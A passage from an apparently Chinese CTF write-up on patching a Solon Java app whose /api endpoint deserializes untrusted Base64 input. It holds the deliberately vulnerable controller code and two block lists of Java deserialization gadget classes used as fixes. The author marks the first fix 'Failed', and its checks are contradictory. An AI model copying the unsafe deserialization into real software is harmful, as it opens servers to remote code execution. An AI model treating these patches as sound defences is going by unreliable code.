operator">=</span><span class="token string">"/log"</span><span class="token punctuation">)</span>    <span class="token keyword">public</span> <span class="token class-name">String</span> <span class="token function">log</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span> <span class="token punctuation">&#123;</span>        <span class="token class-name">String</span> filePath <span class="token operator">=</span> <span class="token string">"./logs/solon.log"</span><span class="token punctuation">;</span>        <span class="token class-name">BufferedReader</span> reader <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">;</span>        <span class="token class-name">StringBuilder</span> stringBuilder <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">StringBuilder</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">try</span> <span class="token punctuation">&#123;</span>            <span class="token class-name">String</span> line<span class="token punctuation">;</span>            reader <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">BufferedReader</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">FileReader</span><span class="token punctuation">(</span>filePath<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>line <span class="token operator">=</span> reader<span class="token punctuation">.</span><span class="token function">readLine</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                stringBuilder<span class="token punctuation">.</span><span class="token function">append</span><span class="token punctuation">(</span>line<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">append</span><span class="token punctuation">(</span><span class="token class-name">System</span><span class="token punctuation">.</span><span class="token function">lineSeparator</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">IOException</span> e<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            e<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">finally</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">try</span> <span class="token punctuation">&#123;</span>                <span class="token keyword">if</span> <span class="token punctuation">(</span>reader <span class="token operator">!=</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                    reader<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token punctuation">&#125;</span>            <span class="token punctuation">&#125;</span>            <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">IOException</span> e<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                e<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">return</span> stringBuilder<span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token annotation punctuation">@Mapping</span><span class="token punctuation">(</span>value<span class="token operator">=</span><span class="token string">"/api"</span><span class="token punctuation">)</span>    <span class="token annotation punctuation">@Post</span>    <span class="token keyword">public</span> <span class="token class-name">String</span> <span class="token function">api</span><span class="token punctuation">(</span><span class="token class-name">Map</span> map<span class="token punctuation">,</span> <span class="token class-name">Context</span> ctx<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span> <span class="token punctuation">&#123;</span>        <span class="token class-name">JSONObject</span> jsonObject <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">JSONObject</span><span class="token punctuation">(</span>ctx<span class="token punctuation">.</span><span class="token function">body</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>map<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">!=</span> jsonObject<span class="token punctuation">.</span><span class="token function">length</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token class-name">User</span> user <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">User</span><span class="token punctuation">)</span><span class="token class-name">DemoController</span><span class="token punctuation">.</span><span class="token function">deserialize</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">)</span>map<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">"data"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">return</span> user<span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">return</span> <span class="token string">"success"</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">static</span> <span class="token class-name">Object</span> <span class="token function">deserialize</span><span class="token punctuation">(</span><span class="token class-name">String</span> data<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> decode <span class="token operator">=</span> <span class="token class-name">Base64</span><span class="token punctuation">.</span><span class="token function">getDecoder</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">decode</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">ObjectInputStream</span> ois <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ObjectInputStream</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">ByteArrayInputStream</span><span class="token punctuation">(</span>decode<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token keyword">boolean</span> check <span class="token operator">=</span> <span class="token boolean">false</span><span class="token punctuation">;</span>            <span class="token keyword">protected</span> <span class="token class-name">Class</span> <span class="token function">resolveClass</span><span class="token punctuation">(</span><span class="token class-name">ObjectStreamClass</span> desc<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">IOException</span><span class="token punctuation">,</span> <span class="token class-name">ClassNotFoundException</span> <span class="token punctuation">&#123;</span>                <span class="token class-name">Class</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token operator">?</span><span class="token punctuation">></span></span> targetc <span class="token operator">=</span> <span class="token keyword">super</span><span class="token punctuation">.</span><span class="token function">resolveClass</span><span class="token punctuation">(</span>desc<span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token keyword">this</span><span class="token punctuation">.</span>check <span class="token operator">&amp;&amp;</span> <span class="token operator">!</span><span class="token class-name">User</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">.</span><span class="token function">isAssignableFrom</span><span class="token punctuation">(</span>targetc<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                    <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">IllegalArgumentException</span><span class="token punctuation">(</span><span class="token string">"HackerClass:"</span> <span class="token operator">+</span> targetc<span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token punctuation">&#125;</span>                <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token class-name">BadAttributeValueExpException</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">.</span><span class="token function">isAssignableFrom</span><span class="token punctuation">(</span>targetc<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                    <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">IllegalArgumentException</span><span class="token punctuation">(</span><span class="token string">"HackerClass:"</span> <span class="token operator">+</span> targetc<span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token punctuation">&#125;</span>                <span class="token keyword">this</span><span class="token punctuation">.</span>check <span class="token operator">=</span> <span class="token boolean">true</span><span class="token punctuation">;</span>                <span class="token keyword">return</span> targetc<span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> ois<span class="token punctuation">.</span><span class="token function">readObject</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>一眼丁真漏洞点在反序列化上，还提供了<code>resolveClass</code>过滤，看了下依赖里面有个fastjson，不知道是不是打那个，反正我刚好没学这个（</p><h3 id="fix（Failed）"><a href="#fix（Failed）" class="headerlink" title="fix（Failed）"></a>fix（Failed）</h3><p>一点小问题：反编译的时候还反编译出了一个DemoController$1的子类，但是IDEA识别不到，不知道怎么回事</p><p>尝试继续重写resolveClass</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">com<span class="token punctuation">.</span>example<span class="token punctuation">.</span>demo</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token operator">*</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token operator">*</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">javax<span class="token punctuation">.</span>management<span class="token punctuation">.</span></span><span class="token class-name">BadAttributeValueExpException</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>json<span class="token punctuation">.</span></span><span class="token class-name">JSONObject</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>noear<span class="token punctuation">.</span>solon<span class="token punctuation">.</span>annotation<span class="token punctuation">.</span></span><span class="token class-name">Controller</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>noear<span class="token punctuation">.</span>solon<span class="token punctuation">.</span>annotation<span class="token punctuation">.</span></span><span class="token class-name">Mapping</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>noear<span class="token punctuation">.</span>solon<span class="token punctuation">.</span>annotation<span class="token punctuation">.</span></span><span class="token class-name">Post</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>noear<span class="token punctuation">.</span>solon<span class="token punctuation">.</span>core<span class="token punctuation">.</span>handle<span class="token punctuation">.</span></span><span class="token class-name">Context</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>noear<span class="token punctuation">.</span>solon<span class="token punctuation">.</span>core<span class="token punctuation">.</span>handle<span class="token punctuation">.</span></span><span class="token class-name">ModelAndView</span></span><span class="token punctuation">;</span><span class="token annotation punctuation">@Controller</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">DemoController</span> <span class="token punctuation">&#123;</span>    <span class="token annotation punctuation">@Mapping</span><span class="token punctuation">(</span>value<span class="token operator">=</span><span class="token string">"/"</span><span class="token punctuation">)</span>    <span class="token keyword">public</span> <span class="token class-name">ModelAndView</span> <span class="token function">index</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span> <span class="token punctuation">&#123;</span>        <span class="token class-name">ModelAndView</span> model <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ModelAndView</span><span class="token punctuation">(</span><span class="token string">"freemarker.ftl"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        model<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span><span class="token string">"msg"</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token class-name">Object</span><span class="token punctuation">)</span><span class="token string">"/api"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> model<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token comment">/*     * WARNING - Removed try catching itself - possible behaviour change.     */</span>    <span class="token annotation punctuation">@Mapping</span><span class="token punctuation">(</span>value<span class="token operator">=</span><span class="token string">"/log"</span><span class="token punctuation">)</span>    <span class="token keyword">public</span> <span class="token class-name">String</span> <span class="token function">log</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span> <span class="token punctuation">&#123;</span>        <span class="token class-name">String</span> filePath <span class="token operator">=</span> <span class="token string">"./logs/solon.log"</span><span class="token punctuation">;</span>        <span class="token class-name">BufferedReader</span> reader <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">;</span>        <span class="token class-name">StringBuilder</span> stringBuilder <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">StringBuilder</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">try</span> <span class="token punctuation">&#123;</span>            <span class="token class-name">String</span> line<span class="token punctuation">;</span>            reader <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">BufferedReader</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">FileReader</span><span class="token punctuation">(</span>filePath<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>line <span class="token operator">=</span> reader<span class="token punctuation">.</span><span class="token function">readLine</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                stringBuilder<span class="token punctuation">.</span><span class="token function">append</span><span class="token punctuation">(</span>line<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">append</span><span class="token punctuation">(</span><span class="token class-name">System</span><span class="token punctuation">.</span><span class="token function">lineSeparator</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">IOException</span> e<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            e<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">finally</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">try</span> <span class="token punctuation">&#123;</span>                <span class="token keyword">if</span> <span class="token punctuation">(</span>reader <span class="token operator">!=</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                    reader<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token punctuation">&#125;</span>            <span class="token punctuation">&#125;</span>            <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">IOException</span> e<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                e<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">return</span> stringBuilder<span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token annotation punctuation">@Mapping</span><span class="token punctuation">(</span>value<span class="token operator">=</span><span class="token string">"/api"</span><span class="token punctuation">)</span>    <span class="token annotation punctuation">@Post</span>    <span class="token keyword">public</span> <span class="token class-name">String</span> <span class="token function">api</span><span class="token punctuation">(</span><span class="token class-name">Map</span> map<span class="token punctuation">,</span> <span class="token class-name">Context</span> ctx<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span> <span class="token punctuation">&#123;</span>        <span class="token class-name">JSONObject</span> jsonObject <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">JSONObject</span><span class="token punctuation">(</span>ctx<span class="token punctuation">.</span><span class="token function">body</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>map<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">!=</span> jsonObject<span class="token punctuation">.</span><span class="token function">length</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token class-name">User</span> user <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">User</span><span class="token punctuation">)</span><span class="token class-name">DemoController</span><span class="token punctuation">.</span><span class="token function">deserialize</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">)</span>map<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">"data"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">return</span> user<span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">return</span> <span class="token string">"success"</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">static</span> <span class="token class-name">Object</span> <span class="token function">deserialize</span><span class="token punctuation">(</span><span class="token class-name">String</span> data<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> decode <span class="token operator">=</span> <span class="token class-name">Base64</span><span class="token punctuation">.</span><span class="token function">getDecoder</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">decode</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">ObjectInputStream</span> ois <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ObjectInputStream</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">ByteArrayInputStream</span><span class="token punctuation">(</span>decode<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token keyword">boolean</span> check <span class="token operator">=</span> <span class="token boolean">false</span><span class="token punctuation">;</span>            <span class="token keyword">private</span> <span class="token class-name">ArrayList</span> <span class="token class-name">Blacklist</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">ArrayList</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token class-name">ObjectInputStream</span><span class="token punctuation">(</span><span class="token class-name">InputStream</span> in<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">IOException</span> <span class="token punctuation">&#123;</span>                <span class="token class-name"><span class="token namespace">this<span class="token punctuation">.</span></span>Blacklist</span><span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token class-name">Hashtable</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token class-name"><span class="token namespace">this<span class="token punctuation">.</span></span>Blacklist</span><span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token class-name">HashSet</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token class-name"><span class="token namespace">this<span class="token punctuation">.</span></span>Blacklist</span><span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token class-name">TreeMap</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token class-name"><span class="token namespace">this<span class="token punctuation">.</span></span>Blacklist</span><span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token class-name">BadAttributeValueExpException</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>            <span class="token keyword">protected</span> <span class="token class-name">Class</span> <span class="token function">resolveClass</span><span class="token punctuation">(</span><span class="token class-name">ObjectStreamClass</span> desc<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">IOException</span><span class="token punctuation">,</span> <span class="token class-name">ClassNotFoundException</span> <span class="token punctuation">&#123;</span>                <span class="token class-name">Class</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token operator">?</span><span class="token punctuation">></span></span> targetc <span class="token operator">=</span> <span class="token keyword">super</span><span class="token punctuation">.</span><span class="token function">resolveClass</span><span class="token punctuation">(</span>desc<span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token keyword">this</span><span class="token punctuation">.</span>check <span class="token operator">&amp;&amp;</span> <span class="token operator">!</span><span class="token class-name">User</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">.</span><span class="token function">isAssignableFrom</span><span class="token punctuation">(</span>targetc<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                    <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">IllegalArgumentException</span><span class="token punctuation">(</span><span class="token string">"HackerClass:"</span> <span class="token operator">+</span> targetc<span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token punctuation">&#125;</span>                <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token class-name">BadAttributeValueExpException</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">.</span><span class="token function">isAssignableFrom</span><span class="token punctuation">(</span>targetc<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                    <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">IllegalArgumentException</span><span class="token punctuation">(</span><span class="token string">"HackerClass:"</span> <span class="token operator">+</span> targetc<span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token punctuation">&#125;</span>                <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span>desc<span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">equals</span><span class="token punctuation">(</span><span class="token string">"commons.collections"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>                    <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">InvalidClassException</span><span class="token punctuation">(</span><span class="token string">"Unauthorized"</span><span class="token punctuation">,</span>desc<span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token punctuation">&#125;</span>                <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span>desc<span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">equals</span><span class="token punctuation">(</span><span class="token string">"com.alibaba.fastjson.JSON"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>                    <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">InvalidClassException</span><span class="token punctuation">(</span><span class="token string">"Unauthorized"</span><span class="token punctuation">,</span>desc<span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token punctuation">&#125;</span>                <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token class-name"><span class="token namespace">this<span class="token punctuation">.</span></span>Blacklist</span><span class="token punctuation">.</span><span class="token function">contains</span><span class="token punctuation">(</span>desc<span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                    <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">InvalidClassException</span><span class="token punctuation">(</span><span class="token string">"dont do this"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token punctuation">&#125;</span>                <span class="token keyword">this</span><span class="token punctuation">.</span>check <span class="token operator">=</span> <span class="token boolean">true</span><span class="token punctuation">;</span>                <span class="token keyword">return</span> targetc<span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> ois<span class="token punctuation">.</span><span class="token function">readObject</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>来自光辉师傅のfix，通防？：</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">protected</span> <span class="token class-name">Class</span> <span class="token function">resolveClass</span><span class="token punctuation">(</span><span class="token class-name">ObjectStreamClass</span> desc<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">IOException</span><span class="token punctuation">,</span> <span class="token class-name">ClassNotFoundException</span> <span class="token punctuation">&#123;</span>                <span class="token keyword">if</span><span class="token punctuation">(</span>desc<span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">contains</span><span class="token punctuation">(</span><span class="token string">"asp"</span><span class="token punctuation">)</span><span class="token operator">||</span>desc<span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">contains</span><span class="token punctuation">(</span><span class="token string">"javax.management"</span><span class="token punctuation">)</span><span class="token operator">||</span>desc<span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">contains</span><span class="token punctuation">(</span><span class="token string">"AbstractTranslet"</span><span class="token punctuation">)</span><span class="token operator">||</span>desc<span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">contains</span><span class="token punctuation">(</span><span class="token string">"Fastjson"</span><span class="token punctuation">)</span><span class="token operator">||</span>desc<span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">contains</span><span class="token punctuation">(</span><span class="token string">"jmx"</span><span class="token punctuation">)</span><span class="token operator">||</span>desc<span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">contains</span><span class="token punctuation">(</span><span class="token string">"HashMap"</span><span class="token punctuation">)</span><span class="token operator">||</span>desc<span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">contains</span><span class="token punctuation">(</span><span class="token string">"java.lang"</span><span class="token 